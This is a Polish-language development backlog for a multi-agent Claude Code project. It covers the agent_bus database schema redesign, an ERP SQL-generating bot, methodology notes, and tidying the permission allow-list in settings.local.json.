Hook bezpieczenstwa generuje osobny klucz dla komend zaczynajacych sie od znaku nowej linii (__NEW_LINE_hash__ python:*), ktory nie matchuje wzorca Bash(python:*).

Niezbadane: czy Bash(\npython:*) w settings.local.json rozwiazuje problem. Czy problem dotyczy tylko python czy tez innych komend (git, pytest).

Do zbadania: jak hook generuje klucze dla multiline — sprawdzic kod hooka lub przetestowac dodajac Bash(\npython:*) i Bash(\ngit:*).

Zalezy od: potwierdzenia ktore komendy sa blokowane i w jakich warunkach.

### [23] settings.local.json posprzatany — usunieto 5 jednorazowych hardcoded komend, artefakty __NEW_LINE__, WebFetch(domain:),
**area:** Dev  **status:** done  **created_at:** 2026-03-13

settings.local.json posprzatany — usunieto 5 jednorazowych hardcoded komend, artefakty __NEW_LINE__, WebFetch(domain:), redundantne git subkomendy. Dodano pytest:*, cp:*. Bash(python:*) pokrywa agent_bus_cli bez blokowania hooka — potwierdzone testem. DONE 2026-03-13.

### [22] Rewizja reguł Bash w DEVELOPER.md po uporządkowaniu settings.local.json
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Dev] Rewizja reguł Bash w DEVELOPER.md po uporządkowaniu settings.local.json

Po wdrożeniu backlog id=31 (porządek uprawnień) — przejrzeć sekcję "Reguły pisania komend Bash" w DEVELOPER.md.

Pytanie: które reguły istnieją z powodu brakujących uprawnień w settings, a które mają realne uzasadnienie?
Zakaz $() i python -c może być obejściem hooka, nie realną potrzebą bezpieczeństwa.

Cel: usunąć reguły które są prowizorką — zostawić tylko te z realnym uzasadnieniem niezależnym od hooka.

Zależność: zrobić po backlog id=31.

### [21] settings.local.json — uporzadkowanie uprawnien + agent_bus
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Dev] settings.local.json — uporzadkowanie uprawnien + agent_bus

Dodac do permissions.allow:
- Bash(python tools/agent_bus_cli.py:*) — agent_bus bez zatwierdzenia
- Bash(python tools/git_commit.py:*) — jesli nie ma
- Bash(python tools/migrate_*:*) — skrypty migracyjne

Posprzatac: usunac hardcoded jednorazowe wpisy (cd && grep -n ..., cd && taskkill, cd && mv ...).
Zostawic tylko wzorce generyczne.

Plik: .claude/settings.local.json

### [20] Zasada projektowania DB — przykładowe rekordy przed schematem
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Dev] Zasada projektowania DB — przykładowe rekordy przed schematem

Przed napisaniem CREATE TABLE napisz 5 przykladowych INSERT-ow dla roznych przypadkow.
Jesli przyklady nie pasuja do schematu — schemat jest zly.

Wdrozenie: dodac do DEVELOPER.md jako zasade projektowania baz danych.
Miejsce: sekcja CODE QUALITY STANDARDS lub nowa sekcja 'Projektowanie danych'.

Uzasadnienie: schemat DB to decyzja o rozumieniu domeny, nie techniczna.
Rozmowy o domenie nie mozna zastapic dobrymi pytaniami — wymaga ze user zobaczy
konkretne dane. Sesja 2026-03-13: 3 iteracje korekcji schematu agent_bus bo
zaczeto od abstrakcji zamiast od przykladow.

### [19] agent_bus — przebudowa schematu DB (faza 1.5)
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-13

### [Arch] agent_bus — przebudowa schematu DB (faza 1.5)

Uzgodniony nowy schemat zamiast obecnych tabel messages + state:

NOWE TABELE:
- suggestions (id, author, recipients JSON|null, content, status, backlog_id FK, session_id, created_at)
  status: open | in_backlog | rejected | implemented
- backlog (id, title, content, area, value, effort, status, source_suggestion_id FK, created_at, updated_at)
  status: planned | in_progress | done | cancelled
- session_log (id, role, content, session_id, created_at)
- messages — zostaje bez zmian (bezposrednia komunikacja agent-agent)

MIGRACJA:
- state type=backlog_item (27 wpisow) -> backlog + suggestions z status=in_backlog
- state type=reflection -> suggestions z status=open
- state type=progress -> session_log
- messages -> bez zmian

KOLEJNOSC:
1. Nowy schemat w agent_bus.py (TDD — testy pierwsze)
2. Skrypt migracyjny dla istniejacych 27 wpisow
3. Aktualizacja agent_bus_cli.py (nowe komendy per tabela)
4. Aktualizacja testow
5. Aktualizacja dokumentow rol (nowe komendy CLI)

### [18] Komunikacja w roju — wzorzec dla warstwy myśli
**area:** Arch  **status:** deferred  **created_at:** 2026-03-13

### Komunikacja w roju — wzorzec dla warstwy myśli

**Źródło:** sesja metodologiczna 2026-03-12
**Sesja:** 2026-03-12
**Dokument do zmiany:** METHODOLOGY.md — nowa sekcja "Architektura agentocentryczna"

Wypracowany wzorzec dla wspólnej pamięci agentów (warstwa myśli):

**Wzorzec:** Hybryda Blackboard + Tuple Space z uwagą jako sygnałem wartości

Trzy warstwy komunikacji:
1. Dyrektywy — stabilne wytyczne per rola (statyczne, .md lub DB)
2. Wiadomości — kierowana komunikacja punkt-punkt (adresowane)
3. Myśli — wspólna przestrzeń tematyczna (tagowana, bez adresata)

Zasady warstwy myśli:
- Odczyt niedestruktywny (`rd` nie `in`) — myśli persystują po przeczytaniu
- Tagi jako metadata filter + treść semantycznie (hybryda deterministyczny + probabilistyczny)
- Score oparty na uwadze: `score += 1` przy każdym odczycie, `score -= δ` pasywnie
- Ważność wyłania się z wzorca użycia roju — bez ręcznej priorytetyzacji
- Ewaporacja odwrotna: myśli często przywoływane rosną, ignorowane gasną

Research potwierdza: wzorzec jest znany (Blackboard, Tuple Space, ACO), brak gotowej
implementacji dla LLM — do zbudowania. Ref: `research_results_swarm_communication.md`

**Status:** Koncepcja zatwierdzona metodologicznie. Czeka na weryfikację implementacyjną
przez Developera — patrz `handoff_db_architecture.md` (zaktualizowany 2026-03-12).
Ryzyko: pułapka wdrożeniowa — wizjonerska koncepcja może okazać się nieproporcjonalnie
kosztowna lub technicznie niewykonalna w obecnym stacku.

---

### [17] Model wirtualnej firmy AI — zasady do METHODOLOGY.md
**area:** Metodolog  **status:** planned  **created_at:** 2026-03-13

### Model wirtualnej firmy AI — zasady do METHODOLOGY.md

**Źródło:** methodology_suggestions (sesja 2026-03-11)
**Sesja:** 2026-03-11
**Dokument do zmiany:** METHODOLOGY.md (nowa sekcja lub rozszerzenie "Trzy poziomy działania")

Wypracowane zasady czekające na wdrożenie:

1. Podział ról człowiek/AI — rola trafia do tego kto lepiej ją wypełnia w danym momencie.
   Warunek przydziału do AI: decyzje przewidywalne i weryfikowalne.

2. Jednostka pracy — zdefiniuj zanim zaczniesz zbierać refleksje. Definicja należy
   do dokumentu roli w projekcie, nie do metodologii.

3. Struktura organizacyjna przy skali — przepływ refleksji odzwierciedla org chart.
   PM jako warstwa agregująca między developerami a metodologiem.

Ref. methodology_suggestions.md: [2026-03-11] Wirtualna firma AI.

---

### [16] Przycinanie ramy teoretycznej
**area:** Metodolog  **status:** planned  **created_at:** 2026-03-13

### Przycinanie ramy teoretycznej

**Źródło:** methodology_suggestions
**Sesja:** 2026-03-08
**Dokument do zmiany:** METHODOLOGY.md (sekcja "Wprowadzenie")

Test operacyjny dla każdego pojęcia: czy zmienia jakąkolwiek decyzję?
Fraktalność — tak (ta sama struktura per poziom złożoności).
Genomiczność, cybernetyka drugiego rzędu — legitymizacja, nie instrukcja.
Zostawić jedną ramę orientacyjną, resztę zastąpić konkretnymi warunkami.

---

### [15] generate_view — pliki podgladowe .md z mrowisko.db dla czlowieka
**area:** Arch  **status:** cancelled  **created_at:** 2026-03-13

### [Arch] generate_view — pliki podgladowe .md z mrowisko.db dla czlowieka

**Zrodlo:** decyzja architektoniczna 2026-03-13
**Wartosc:** wysoka
**Pracochlonn:** mala

Narzedzie generujace pliki .md z danych w mrowisko.db na zadanie.

Przypadki uzycia:
- generate_view backlog -> backlog_view.md (posortowany wedlug wartosci/obszaru)
- generate_view inbox --role human -> human_inbox_view.md
- generate_view reflections --role erp_specialist -> reflections_view.md
- generate_view reflections --role metodolog -> methodology_suggestions_view.md

Czlowiek otrzymuje czytelny plik .md zamiast JSON z CLI.
Plik generowany na zadanie, nie utrzymywany recznie.

### [14] Model abstraction layer -- multi-model + fallback
**area:** Arch  **value:** srednia  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-13

### [Arch] Model abstraction layer -- multi-model + fallback

**Źródło:** research AGI horizon + sesja metodologiczna 2026-03-12
**Sesja:** 2026-03-12
**Wartość:** średnia
**Pracochłonność:** średnia

Cienka warstwa abstrakcji między logiką biznesową a dostawcą modelu.
Umożliwia multi-model routing, fallback i łatwą zmianę dostawcy.

Interfejs: `llm.complete(task, context, tier)` gdzie tier mapuje na model:
- "heavy" → Claude Opus (złożone zadania)
- "standard" → Claude Sonnet (typowe zadania)
- "cheap" → Haiku (proste klasyfikacje, routing)
- "fallback" → lokalne Llama/Ollama (gdy API niedostępne)

Istniejący fundament: `BOT_MODEL_FORMAT` env var w bocie, backlog #5 (routing Haiku/Sonnet).
Brakuje: ujednolicony interfejs, konfiguracja per-tier, fallback logic, support open-weight.

Priorytet niższy niż eval/audit -- Claude działa stabilnie, nie pali się.
Staje się krytyczny przy: zmianie pricingu, awarii API, wejściu na rynek (horyzont 2).

---

### [13] Audit trail / trace -- logowanie decyzji agentów
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** cancelled  **created_at:** 2026-03-13

### [Arch] Audit trail / trace -- logowanie decyzji agentów

**Źródło:** research AGI horizon + sesja metodologiczna 2026-03-12
**Sesja:** 2026-03-12
**Wartość:** wysoka
**Pracochłonność:** średnia

Structured log każdego kroku agenta: co przeczytał, jakie narzędzie wywołał,
jaką decyzję podjął i dlaczego, jaki był wynik.

Cele:
- Debugging: odtworzenie ścieżki gdy widok/konfiguracja ma błąd
- Uczenie się: wzorce z 50+ sesji (gdzie agent się myli, co traci kontekst)
- Regulacje: EU AI Act wymaga audytowalności dla produktu enterprise (horyzont 2)
- Skala: jedyny sposób na monitoring mrowiska przy wielu agentach (horyzont 3)

Istniejący fundament: `logs/bot/YYYY-MM-DD.jsonl`, progress_log, suggestions.
Brakuje: ujednolicony format, narzędzie do odtwarzania sesji, trace per-task.

Łączy się z: handoff DB architecture (tabela `state`/`audit`), architektura agentocentryczna.

---

### [12] Eval harness -- golden tasks dla widoków BI i bota
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-13

### [Arch] Eval harness -- golden tasks dla widoków BI i bota

**Źródło:** research AGI horizon + sesja metodologiczna 2026-03-12
**Sesja:** 2026-03-12
**Wartość:** wysoka
**Pracochłonność:** średnia

Zestaw golden tasks z oczekiwanym wynikiem, wykonywanych automatycznie po zmianach.
Testuje zachowanie systemu jako całości, nie pojedyncze narzędzia.

Zakres:
- Golden tasks BI: "zbuduj widok dla X" → oczekiwany SQL, count, brak NULL w kluczach
- Golden tasks bot: pytanie → oczekiwany SQL, poprawne kolumny, poprawny wynik
- Golden tasks konfiguracja: "znajdź prefiksy w tabeli Y" → oczekiwany komplet

Istniejący fundament: 253+ testów jednostkowych, 10 pytań testowych bota.
Brakuje: format golden task, runner end-to-end, raport pass/fail, porównanie z wzorcem.

Moat: evale na realnych zadaniach ERP z prawdziwymi danymi -- tego vendor nie skopiuje.
Rośnie organicznie z każdym zrealizowanym zadaniem.

---

### [11] Sesja inspekcji schematu CDN
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [ERP] Sesja inspekcji schematu CDN

**Źródło:** obserwacja sesji 2026-03-11
**Sesja:** 2026-03-11
**Wartość:** średnia
**Pracochłonność:** mała

Niezbadane: inne funkcje CDN, widoki CDN.* vs tabele, tabele słownikowe powtarzalne w widokach BI.
Propozycja: INFORMATION_SCHEMA + sp_helptext przed kolejnym widokiem BI.

---

### [10] Research prompts -- plik odpowiedzi + rola Researcher
**area:** Arch  **value:** srednia  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-13

### [Arch/Metodolog] Research prompts -- plik odpowiedzi + rola Researcher

**Źródło:** sesja metodologiczna 2026-03-12
**Sesja:** 2026-03-12
**Wartość:** średnia
**Pracochłonność:** mała-średnia

Obecnie research prompty (documents/methodology/research_prompt_*.md) są wykonywane
przez zewnętrzne narzędzie przeglądarkowe, a wyniki wklejane ręcznie.

Krótkoterminowo (zrobione): każdy prompt zawiera sekcję "Plik odpowiedzi" z instrukcją
zapisu wyników do `research_results_*.md`.

Długoterminowo: rola agenturalna Researcher z dostępem do WebSearch/WebFetch,
która czyta prompt badawczy i autonomicznie zapisuje wyniki. Routing w CLAUDE.md.

---

### [9] Brak backlogu per-rola — eskalacja do Metodologa
**area:** Arch  **value:** srednia  **effort:** srednia  **status:** done  **created_at:** 2026-03-13

### [Arch] Brak backlogu per-rola — eskalacja do Metodologa

**Źródło:** obserwacja sesji 2026-03-11
**Sesja:** 2026-03-11
**Wartość:** średnia
**Pracochłonność:** mała–średnia

Zadania domenowe (ERP, Bot) mieszają się z architektonicznymi w jednym pliku.
Opcje: osobne pliki per-rola vs tagi domenowe.
Decyzja należy do Metodologa.

---

### [8] arch_check.py — walidator ścieżek w dokumentach
**area:** Arch  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Arch] arch_check.py — walidator ścieżek w dokumentach

**Źródło:** obserwacja sesji 2026-03-11
**Sesja:** 2026-03-11
**Wartość:** średnia
**Pracochłonność:** mała

Skanuje pliki `.md` w poszukiwaniu wzorców `` `documents/...` `` i sprawdza czy ścieżki istnieją.
Do wdrożenia przy kolejnym dużym refaktorze.

---

### [7] Sygnatury narzędzi powielone w wielu miejscach
**area:** Arch  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Arch] Sygnatury narzędzi powielone w wielu miejscach

**Źródło:** developer_suggestions
**Sesja:** 2026-03-08
**Wartość:** średnia
**Pracochłonność:** mała (opcja 3) / duża (opcja 1)

Opcje:
1. `gen_docs.py` generuje sekcję Narzędzia z docstringów
2. Jeden plik referencyjny TOOLS.md + dyscyplina
3. Test CI sprawdzający czy narzędzia w AGENT.md istnieją jako pliki w tools/

---

### [6] Fallback przy błędzie SQL
**area:** Bot  **value:** srednia  **effort:** srednia  **status:** done  **created_at:** 2026-03-13

### [Bot] Fallback przy błędzie SQL

**Źródło:** obserwacja sesji testowej
**Sesja:** 2026-03-10
**Wartość:** średnia
**Pracochłonność:** średnia

Gdy `execution_result.ok = False` — ponów Call 1 z instrukcją "wygeneruj prostszą wersję".
Max 1 retry.

---

### [5] Routing model — Haiku dla prostych pytań, Sonnet dla złożonych
**area:** Bot  **value:** srednia  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-13

### [Bot] Routing model — Haiku dla prostych pytań, Sonnet dla złożonych

**Źródło:** obserwacja sesji testowej
**Sesja:** 2026-03-10
**Wartość:** średnia
**Pracochłonność:** średnia

Classifier w Call 1 — Haiku ocenia złożoność i wybiera model do generowania SQL.

---

### [4] Reload konfiguracji bez restartu
**area:** Bot  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Bot] Reload konfiguracji bez restartu

**Źródło:** obserwacja sesji testowej
**Sesja:** 2026-03-10
**Wartość:** średnia
**Pracochłonność:** mała

Komenda `/reload` przez Telegram (tylko admin) lub watchdog na `.env`.

---

### [3] Kontekst firmowy + prompt caching
**area:** Bot  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-13

### [Bot] Kontekst firmowy + prompt caching

**Źródło:** obserwacja sesji testowej Haiku
**Sesja:** 2026-03-10
**Wartość:** wysoka
**Pracochłonność:** mała–średnia

Bot nie zna wartości słownikowych (magazyny, handlowcy) → błędne WHERE, zerowy row_count.

Rozwiązanie:
1. `bot/config/business_context.txt` — fakty firmowe
2. Prompt caching (`cache_control: ephemeral`) — koszt ~10x niższy dla statycznej części

---

### [2] NO_SQL zbyt agresywne — częściowe odpowiedzi
**area:** Bot  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Bot] NO_SQL zbyt agresywne — częściowe odpowiedzi

**Źródło:** obserwacja sesji testowej
**Sesja:** 2026-03-10
**Wartość:** wysoka
**Pracochłonność:** mała

Bot zwraca NO_SQL gdy pytanie zawiera dane częściowo niedostępne. Powinien odpowiedzieć
na część pytania i poinformować o braku pozostałych danych.

Fix w `SYSTEM_PROMPT_TEMPLATE` (`nlp_pipeline.py`):
- Obecne: "Jeśli pytanie jest poza zakresem → odpowiedz NO_SQL"
- Poprawione: "Jeśli pytanie jest częściowo poza zakresem → wygeneruj SQL dla dostępnej części. NO_SQL tylko gdy całkowicie poza zakresem."

---

### [1] LOOM — publikacja na GitHub
**area:** Dev  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-13

### [Dev] LOOM — publikacja na GitHub

**Źródło:** methodology_progress
**Sesja:** 2026-03-11
**Wartość:** średnia
**Pracochłonność:** mała

Folder `_loom/` zawiera komplet plików gotowych do wypchnięcia jako osobne repo.

Kroki:
1. Utwórz repo GitHub (np. `CyperCyper/loom`)
2. Wypchnij zawartość `_loom/` jako root repo
3. Zaktualizuj placeholder URL w `_loom/seed.md`

---
